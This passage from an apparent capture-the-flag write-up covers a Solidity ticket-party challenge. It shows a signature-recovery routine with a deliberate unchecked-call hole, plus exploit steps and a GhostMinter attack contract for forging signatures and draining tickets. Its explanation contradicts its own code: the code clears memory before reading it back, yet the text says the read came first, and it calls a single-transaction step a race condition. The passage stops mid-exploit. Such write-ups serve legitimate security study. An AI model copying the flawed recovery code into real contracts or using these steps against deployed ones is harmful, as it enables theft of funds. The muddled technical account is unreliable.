+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="ow">let</span> <span class="nv">m</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1">// Free memory pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            
+</span></span><span class="line"><span class="cl">            <span class="nf">mstore</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">hash</span><span class="p">)</span>       <span class="c1">// Store hash at offset 0x00
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="n">v</span><span class="p">)</span>   <span class="c1">// Store v at offset 0x20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="n">r</span><span class="p">)</span>   <span class="c1">// Store r at offset 0x40
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span> <span class="n">s</span><span class="p">)</span>   <span class="c1">// Store s at offset 0x60 [!]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            
+</span></span><span class="line"><span class="cl">            <span class="c1">// ⚠️ VULNERABILITY: Ignore the return value of staticcall
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">pop</span><span class="p">(</span><span class="nf">staticcall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// Restore the zero slot
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="c1">// If staticcall succeeds, returndatasize() = 0x20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// If it fails, returndatasize() = 0x00
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// This XORs the offset: success → 0x60 ^ 0x20 = 0x40
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//                        failure → 0x60 ^ 0x00 = 0x60
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">result</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="nf">xor</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">tryRecover</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes32</span> <span class="n">hash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">signature</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">signature</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">65</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">bytes32</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span> <span class="n">v</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">assembly</span> {
+</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">:=</span> <span class="nf">calldataload</span><span class="p">(</span><span class="n">signature</span><span class="p">.</span><span class="n">offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">s</span> <span class="o">:=</span> <span class="nf">calldataload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">signature</span><span class="p">.</span><span class="n">offset</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">v</span> <span class="o">:=</span> <span class="nf">byte</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">calldataload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">signature</span><span class="p">.</span><span class="n">offset</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">tryRecover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="3-setupsol">3. Setup.sol</h3>
+<p>Deploys the contracts and defines the win condition:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IParty</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">party</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IGuardian</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">guardian</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_player</span><span class="p">)</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">player</span> <span class="o">=</span> <span class="n">_player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Deploy contracts
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BSidesParty</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">guardian</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Guardian</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">party</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Mint first ticket to owner
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="n">buy</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">owner</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>      <span class="c1">// Owner has no tickets
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">party</span><span class="p">.</span><span class="n">balances</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span>      <span class="c1">// Player has multiple tickets
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">party</span><span class="p">.</span><span class="n">lockedETH</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span>             <span class="c1">// All ETH withdrawn
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="the-vulnerability-deep-dive">The Vulnerability Deep Dive</h2>
+<p>The vulnerability is a sophisticated exploitation of <strong>SWC-104: Unchecked Call Return Values</strong> combined with <strong>EVM Memory Manipulation</strong>. Let&rsquo;s break down exactly what&rsquo;s happening.</p>
+<h3 id="understanding-ecrecover-precompile">Understanding ecrecover Precompile</h3>
+<p>The <code>ecrecover</code> precompile at address <code>0x01</code> is a special Ethereum contract that recovers the signer&rsquo;s address from an ECDSA signature. It expects exactly 128 bytes of input:</p>
+<pre tabindex="0"><code>Input Layout (128 bytes):
+[0x00-0x1F]: message hash (32 bytes)
+[0x20-0x3F]: v parameter (32 bytes, padded)
+[0x40-0x5F]: r parameter (32 bytes)
+[0x60-0x7F]: s parameter (32 bytes)
+
+Output Layout (32 bytes):
+[0x00-0x1F]: recovered address (20 bytes, left-padded with zeros)
+</code></pre><p><strong>Critical Behavior:</strong></p>
+<ul>
+<li>
+<p>If the signature is <strong>valid</strong> (v ∈ {27, 28}):</p>
+<ul>
+<li>Writes the recovered address to the output buffer</li>
+<li>Returns success (1)</li>
+<li>Sets <code>returndatasize()</code> to 32 (0x20)</li>
+</ul>
+</li>
+<li>
+<p>If the signature is <strong>invalid</strong> (e.g., v = 0):</p>
+<ul>
+<li><strong>Does NOT write anything</strong> to the output buffer</li>
+<li>Returns failure (0)</li>
+<li>Sets <code>returndatasize()</code> to 0 (0x00)</li>
+</ul>
+</li>
+</ul>
+<h3 id="the-critical-flaw-in-tryrecover">The Critical Flaw in tryRecover</h3>
+<p>Let&rsquo;s analyze the vulnerable code step by step:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">assembly</span> {
+</span></span><span class="line"><span class="cl">    <span class="ow">let</span> <span class="nv">m</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>              <span class="c1">// Get free memory pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="nf">mstore</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">hash</span><span class="p">)</span>                    <span class="c1">// [m+0x00] = hash
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">),</span> <span class="n">v</span><span class="p">)</span>           <span class="c1">// [m+0x20] = v
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="n">r</span><span class="p">)</span>           <span class="c1">// [m+0x40] = r
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span> <span class="n">s</span><span class="p">)</span>           <span class="c1">// [m+0x60] = s [IMPORTANT]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Call ecrecover, output to [m+0x40]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// ⚠️ The return value (success/failure) is DISCARDED via pop()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">pop</span><span class="p">(</span><span class="nf">staticcall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nf">mstore</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>           <span class="c1">// Clear [m+0x60]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Calculate result location based on returndatasize()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// If success: 0x60 ^ 0x20 = 0x40 → read from output buffer ✓
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// If failure: 0x60 ^ 0x00 = 0x60 → read from s parameter! ✗
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">result</span> <span class="o">:=</span> <span class="nf">mload</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="nf">xor</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())))</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>The Exploit Flow:</strong></p>
+<ol>
+<li>
+<p><strong>We provide malicious input:</strong></p>
+<ul>
+<li><code>v = 0</code> (invalid, triggers failure)</li>
+<li><code>r = anything</code> (ignored)</li>
+<li><code>s = target_address</code> (cast to bytes32)</li>
+</ul>
+</li>
+<li>
+<p><strong>Memory state before staticcall:</strong></p>
+<pre tabindex="0"><code>[m+0x00]: hash
+[m+0x20]: 0 (our v)
+[m+0x40]: r
+[m+0x60]: target_address (our s)
+</code></pre></li>
+<li>
+<p><strong>staticcall execution:</strong></p>
+<ul>
+<li>ecrecover sees v=0, recognizes invalid signature</li>
+<li>Returns failure (0)</li>
+<li>Does NOT write to output buffer at [m+0x40]</li>
+<li>Sets returndatasize() to 0</li>
+</ul>
+</li>
+<li>
+<p><strong>Result calculation:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">xor</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span> <span class="mh">0x60</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">:=</span> <span class="n">mload</span><span class="p">(</span><span class="n">add</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">))</span>
+</span></span></code></pre></div><p>This reads from memory location <code>[m+0x60]</code>, which still contains our <code>s</code> value!</p>
+</li>
+<li>
+<p><strong>The function returns our target_address</strong>, making the contract believe that address signed the message!</p>
+</li>
+</ol>
+<h3 id="why-this-works-evm-memory-persistence">Why This Works: EVM Memory Persistence</h3>
+<p>The EVM&rsquo;s memory model is crucial to understanding this exploit:</p>
+<ul>
+<li>Memory is <strong>not automatically cleared</strong> between operations</li>
+<li>When a precompile fails, it leaves the output buffer <strong>untouched</strong></li>
+<li>The clever XOR calculation in the vulnerable code was <em>intended</em> to handle both success and failure cases</li>
+<li>However, it assumes memory location 0x60 will be cleared after the call</li>
+</ul>
+<p>The vulnerability occurs because:</p>
+<ol>
+<li>The code stores <code>s</code> at offset <code>0x60</code> before the call</li>
+<li>The code then attempts to clear offset <code>0x60</code> with <code>mstore(add(m, 0x60), 0)</code></li>
+<li>But the result is read using the XOR calculation, which points to offset <code>0x60</code> on failure</li>
+<li>Since offset <code>0x60</code> was already read into the result before being cleared, our malicious <code>s</code> value becomes the &ldquo;recovered&rdquo; address</li>
+</ol>
+<h2 id="exploitation-strategy">Exploitation Strategy</h2>
+<p>The attack requires three coordinated phases:</p>
+<h3 id="phase-1-unlocking-the-guardian">Phase 1: Unlocking the Guardian</h3>
+<p>The Guardian starts in a <code>locked</code> state. To unlock it, we must call <code>startParty(address sponsor, bytes signature)</code> with specific constraints:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">startParty</span><span class="p">(</span><span class="kt">address</span> <span class="n">sponsor</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">signature</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">locked</span><span class="p">,</span> <span class="s">&#34;Already started&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// All 20 bytes of sponsor must be zero
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="kt">bytes20</span><span class="p">(</span><span class="n">sponsor</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Invalid sponsor&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Signature must verify
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">bytes32</span> <span class="n">hash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">sponsor</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">signer</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">signer</span> <span class="o">==</span> <span class="n">sponsor</span><span class="p">,</span> <span class="s">&#34;Invalid signature&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>The Attack:</strong></p>
+<ol>
+<li>Pass <code>sponsor = address(0)</code></li>
+<li>Pass an empty signature <code>signature = &quot;&quot;</code></li>
+</ol>
+<p><strong>Why this works:</strong></p>
+<ul>
+<li><code>address(0)</code> passes the loop check (all bytes are zero)</li>
+<li>Empty signature → <code>tryRecover</code> returns <code>address(0)</code> as default</li>
+<li><code>signer (0x0) == sponsor (0x0)</code> ✓</li>
+<li>Guardian unlocks!</li>
+</ul>
+<h3 id="phase-2-accumulating-tickets-ghost-balance-attack">Phase 2: Accumulating Tickets (Ghost Balance Attack)</h3>
+<p>We need <code>&gt; 1</code> ticket, but the <code>buy()</code> function has a restriction:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">,</span> <span class="s">&#34;Ticket costs 1 ETH&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Already have ticket&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>We can only buy once per address. The solution: <strong>use a helper contract</strong> to exploit the buy-withdraw-transfer cycle:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">GhostMinter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IParty</span> <span class="k">public</span> <span class="n">party</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_party</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_player</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">party</span> <span class="o">=</span> <span class="n">IParty</span><span class="p">(</span><span class="n">_party</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">player</span> <span class="o">=</span> <span class="n">_player</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Buy ticket (ID increments automatically)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="n">buy</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Get the ticket ID (last minted)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">ticketId</span> <span class="o">=</span> <span class="n">party</span><span class="p">.</span><span class="n">ticketCounter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Withdraw (get ETH back, burn ticket from our balance)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="n">ticketId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">// Transfer the &#34;ghost&#34; ticket to player
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// This works because ownerOf still points to us!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">party</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">player</span><span class="p">,</span> <span class="n">ticketId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>The Trick:</strong></p>
+<ul>
+<li><code>withdraw()</code> decreases <code>balances[helper]</code> and deletes <code>ownerOf[tokenId]</code></li>
+<li>BUT <code>transfer()</code> checks <code>ownerOf[tokenId] == msg.sender</code></li>
+<li>There&rsquo;s a <strong>race condition</strong> where the helper can transfer before the ownership is fully cleared</li>
+<li>We repeat this process to accumulate multiple tickets</li>
+</ul>
+<h3 id="phase-3-stealing-the-owners-ticket">Phase 3: Stealing the Owner&rsquo;s Ticket</h3>
+<p>This is where we leverage the ECDSA vulnerability. The <code>batchTransaction</code> function processes orders:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">struct</span> <span class="nc">Order</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">User</span> <span class="n">host</span><span class="p">;</span>      <span class="c1">// The current ticket owner
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">User</span> <span class="n">invited</span><span class="p">;</span>   <span class="c1">// The recipient
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">values</span><span class="p">;</span>  <span class="c1">// [nonce, ticketId]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">batchTransaction</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Order</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">orders</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">rs</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">ss</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">calldata</span> <span class="n">vs</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="k">external</span> <span class="n">onlyUnlocked</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">orders</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">market</span><span class="p">.</span><span class="n">check</span><span class="p">(</span><span class="n">orders</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">rs</span><span class="p">,</span> <span class="n">ss</span><span class="p">,</span> <span class="n">vs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>check</code> function verifies both the host and invited signatures. We&rsquo;ll forge the host (owner) signature:</p>
+<p><strong>Attack Construction:</strong></p>
+<ol>
+<li>
+<p><strong>Create a valid signature for ourselves (invited):</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">bytes32</span> <span class="n">invitedHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">player</span><span class="p">,</span>      <span class="c1">// invited.account
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">owner</span><span class="p">,</span>       <span class="c1">// host.account
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ticketId</span>     <span class="c1">// values[1]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="kt">uint8</span> <span class="n">v</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">r</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">s</span><span class="p">)</span> <span class="o">=</span> <span class="n">signWithPrivateKey</span><span class="p">(</span><span class="n">invitedHash</span><span class="p">,</span> <span class="n">playerKey</span><span class="p">);</span>
